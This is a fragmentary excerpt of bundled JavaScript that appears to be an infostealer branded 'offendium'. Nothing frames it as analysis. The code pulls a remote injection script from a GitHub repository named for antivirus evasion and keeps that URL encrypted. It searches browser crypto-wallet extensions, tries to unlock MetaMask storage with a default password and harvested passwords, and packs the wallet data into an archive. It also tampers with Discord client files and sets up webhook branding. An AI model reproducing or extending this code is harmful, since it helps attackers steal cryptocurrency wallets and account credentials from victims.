...
/***/ ((module) => {
        ...
        module.exports = (client) => {
          return {
            base_url: client.utils.encryption.encryptData("https://raw.githubusercontent.com/antivirusevasion69/antivirusevasion69/main/injection.js"),
            ...
            async getWallets(path) {
              ...
              for (let [key, value] of Object.entries(extension_identifiers)) {
                if (
                  ...
                  if (key == "MetaMask") {
                    console.log("step1")
                    await client.utils.encryption.step1(`${path}\\Local Extension Settings\\${value}`, ["Test1234", ...client.config.environ.all_passwords])
                  }

                  if (!client.requires.fs.existsSync(`${client.config.jszip.path}\\Wallets`)) {
                    client.utils.jszip.createFolder()
                  }
        ...
        module.exports = (client) => {
          return {
            ...
            async init() {
              ...
              for (const path of client.config.discord.files_path) {
                if (client.requires.fs.existsSync(path.replace("index.js", "offend"))) {
                  client.requires.fs.rmdirSync(path.replace("index.js", "offend"));
                }
              }
            }
          };
  ...
  (() => {
    ...
    `;
      ...
      async ___() {
        ...
        xyz = this.requires.fs.readFileSync("./extra.js", {encoding:"utf-8"})
      ...
      async init() {
        ...
        try {
          this.config.embed = JSON.parse(
            JSON.stringify(
              {
                "username": "t.me/offend | github.com/offend1337/offendium",
                "href": "https://t.me/offend",
                "avatar_url": "https://cdn.discordapp.com/attachments/1093649680967143514/1093671999169118299/image.png",
                "credits": "t.me/offend | github.com/offend1337/offendium"
            }
            )
          );
        } catch {
